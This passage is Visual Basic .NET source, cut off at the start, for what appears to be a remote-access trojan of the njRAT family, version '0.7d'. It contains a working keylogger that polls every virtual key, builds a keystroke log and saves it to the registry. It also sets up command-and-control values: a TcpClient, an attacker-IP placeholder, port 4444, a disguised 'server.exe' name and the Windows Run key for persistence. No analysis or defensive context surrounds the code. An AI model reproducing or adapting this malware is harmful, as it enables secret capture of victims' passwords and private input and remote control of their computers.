            End If
        End If
        Try
            Select Case k
                Case Keys.Delete, Keys.Back
                    Return ("[" & k.ToString & "]")
                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt, Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End
                    Return ""
                Case Keys.Space
                    Return " "
                Case Keys.Enter, Keys.Enter
                    If Logs.EndsWith("[ENTER]" & ChrW(13) & ChrW(10)) Then
                        Return ""
                    End If
                    Return "[ENTER]" & ChrW(13) & ChrW(10)
                Case Keys.Tab
                    Return "[TAP]" & ChrW(13) & ChrW(10)
            End Select
            If shiftKeyDown Then
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            If shiftKeyDown Then
                str = Strings.ChrW(CInt(k)).ToString.ToUpper
                ProjectData.ClearProjectError()
                Return str
            End If
            str = Strings.ChrW(CInt(k)).ToString.ToLower
            ProjectData.ClearProjectError()
        End Try
        Return str
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function GetAsyncKeyState(ByVal a As Integer) As Short
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function GetKeyboardLayout(ByVal a As Integer) As Integer
    End Function

    <DllImport("user32.dll")>
    Public Shared Function GetKeyboardState(ByVal a As Byte()) As Boolean
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
    Public Shared Function GetWindowThreadProcessId(ByVal a As IntPtr, ByRef b As Integer) As Integer
    End Function

    <DllImport("user32.dll")>
    Public Shared Function MapVirtualKey(ByVal a As UInt32, ByVal b As UInt32) As UInt32
    End Function

    <DllImport("user32.dll")>
    Public Shared Function ToUnicodeEx(ByVal a As UInt32, ByVal b As UInt32, ByVal c As Byte(), <Out, MarshalAs(UnmanagedType.LPWStr)> ByVal d As StringBuilder, ByVal e As Integer, ByVal f As UInt32, ByVal g As IntPtr) As Integer
    End Function

    Public Shared Function VKCodeToUnicode(ByVal a As UInt32) As String
        Try
            Dim d As New StringBuilder
            Dim buffer As Byte() = New Byte(&HFF - 1) {}
            If Not GetKeyboardState(buffer) Then
                Return ""
            End If
            Dim b As UInt32 = MapVirtualKey(a, 0)
            Dim num3 As Integer = 0
            Return d.ToString
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Return DirectCast(CInt(a), Keys).ToString
    End Function

    Public Shared Sub WRK()
        Logs = Conversions.ToString(GTV(VN, ""))
        Try
            Dim num As Integer = 0
            Do While True
                num += 1
                Dim a As Integer = 0
                Do
                    If ((GetAsyncKeyState(a) = -32767) And Not F.Keyboard.CtrlKeyDown) Then
                        Dim k As Keys = DirectCast(a, Keys)
                        Dim str As String = Fix(k)
                        If (str.Length > 0) Then
                            Logs = (Logs & AV())
                            Logs = (Logs & str)
                        End If
                        lastKey = k
                    End If
                    a += 1
                Loop While (a <= &HFF)
                If (num = &H3E8) Then
                    num = 0
                    Dim num3 As Integer = (Conversions.ToInteger("20") * &H400)
                    If (Logs.Length > num3) Then
                        Logs = Logs.Remove(0, (Logs.Length - num3))
                    End If
                    STV(VN, Logs, RegistryValueKind.String)
                End If
                Thread.Sleep(1)
            Loop
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Public Shared b As Byte() = New Byte(&H1401 - 1) {}
    Public Shared BD As Boolean = False
    Public Shared C As TcpClient = New TcpClient
    Public Shared Cn As Boolean = False
    Public Shared DR As String = "TEMP"
    Public Shared EXE As String = StrReverse("exe.revres")
    Public Shared F As Computer = New Computer
    Public Shared H As String = ("coloca tu ip").Replace("#", "1").Replace("$", "0")
    Public Shared Idr As Boolean = False
    Public Shared IsF As Boolean = False
    Public Shared Isu As Boolean = False
    Public Shared lastcap As String = String.Empty
    Public Shared LO As FileInfo = New FileInfo(Application.StartupPath) 'OK
    Public Shared MeM As MemoryStream = New MemoryStream
    Public Shared MT As Object = New Object() {}
    Public Shared P As String = "4444"
    Public Shared PLG As Object = New Object() {}
    Public Shared RG As String = "6a2634340fbf8a0a2c038c6263d49fd1"
    Public Shared sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"
    Public Shared VN As String = "SGFjS2Vk"
    Public Shared VR As String = "0.7d"
    Public Shared Y As String = "|'|'|"
    Public Shared LastAS As String = String.Empty
    Public Shared LastAV As Integer = 0
    Public Shared lastKey As Keys = Keys.None
    Public Shared Logs As String = String.Empty
    Public Shared vn1 As String = "[kl]"


End Class

